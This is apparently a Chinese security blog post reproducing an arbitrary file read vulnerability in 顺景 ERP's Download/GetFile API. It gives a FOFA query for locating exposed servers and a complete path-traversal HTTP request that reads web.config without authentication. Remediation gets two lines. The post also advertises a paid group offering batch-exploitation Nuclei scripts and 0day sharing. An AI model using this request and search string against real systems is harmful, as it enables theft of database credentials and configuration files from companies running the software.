#  「漏洞复现」顺景ERP Download/GetFile 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-11-27 22:03  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oABILx2icJxxajNaib5uic2Zu0vEJnFHklejTAd3txeUafxEgcvIAnRwtCgEF0JrenwZE9EWdEn9Q4w/640?wx_fmt=gif&from=appmsg "")  
  
  
0x01免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
顺景ERP是一款功能全面、高度集成、易于扩展的企业管理软件，能够帮助制造企业实现智能化、精益化管理，提升企业的竞争力和盈利能力。为企业提供全方位信息化的管理应用与支持，例如，在精密五金行业，系统可根据企业的业务流程及特性提供针对性信息化管理方案；在注塑行业，系统具有完整的水口料管理方案，对企业成本控制严谨到位；在电子行业，系统的BOM批量变更功能，能快速准确进行物料变更，并支持替代料功能等。  
  
0x03  
  
**漏洞威胁**  
  
顺景ERP Download/GetFile 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="顺景软件 WebAPI 服务端"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p21sxNbKkXtQWBrMTjWEHyS5STaSUK8OZQLcjAbjYiayUZKzJfu4dZcQSVTx1pc9YiboyNmqDed7fA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /api/Download/GetFile?FileName=/../web.config&Title= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p21sxNbKkXtQWBrMTjWEHy0VkibawdSJFjccotntqlbxYColRtyXdRzAyuMcYthjrFs1icbcfLKDbQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p21sxNbKkXtQWBrMTjWEHySXvqwLgibRHrLstu7BaG3qdCj1Poj2Yxrqk0ZJRNKz02UKeBf6jSnKQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0p21sxNbKkXtQWBrMTjWEHy36awcxvL07SShzNs5tqgCyYgR2DYlbM1C0QDiaQuNL3dSywusTaXFDQ/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0p21sxNbKkXtQWBrMTjWEHyYl1Qiaib0Khgm7Gp9YWuos7C9H0JI98RHuNYvA0iapgjdJoQ2KU109FSQ/640?wx_fmt=gif&from=appmsg "")  
  
  
